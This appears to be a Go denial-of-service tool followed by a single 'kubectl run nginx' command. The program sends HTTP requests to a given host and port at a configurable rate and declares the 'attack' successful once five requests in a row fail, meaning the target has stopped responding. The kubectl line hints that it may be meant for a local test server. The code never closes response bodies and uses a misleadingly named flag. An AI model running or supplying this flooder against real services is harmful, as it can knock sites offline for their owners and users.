package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

func main() {
	var (
		host = os.Args[1]
		port = os.Args[2]
		requestsPerMinute, err = strconv.Atoi(os.Args[3])
		timeout, err1 = strconv.Atoi(os.Args[4])
	)
	if err != nil || err1 != nil {
		fmt.Println("Invalid argument - please specify number of requests per minute")
		return
	}
	interval := 60.0/float64(requestsPerMinute) * 1000.0
	fmt.Printf("Attack initiated - %d request per minute to %s:%s\n", requestsPerMinute, host, port)

	var attackSuccessful = make(chan bool)
	var counter = make(chan bool)
	go func() {
		for {
			go func() {
				resp, err := http.Get(fmt.Sprintf("http://%s:%s", host, port))
				if err != nil {
					fmt.Println("Response FAILED")
					counter <- true
					return
				}
				counter <- false
				fmt.Println("Response OK", resp.StatusCode)
			}()
			time.Sleep(time.Duration(interval) * time.Millisecond)
		}
	}()

	go func() {
		failed := 0
		for isOk := range counter {
			if isOk {
				failed++
			} else {
				failed = 0
			}
			if failed >= 5 {
				attackSuccessful <- true
				return
			}
		}
	}()

	//waits specified period of time and end attack
	go func() {
		time.Sleep(time.Duration(timeout) * time.Second)
		attackSuccessful <- false
	}()

	result := <-attackSuccessful
	if result {
		fmt.Println("Attack is successful")
	} else {
		fmt.Println("Attack has failed")
	}
}

kubectl run nginx --image nginx:latest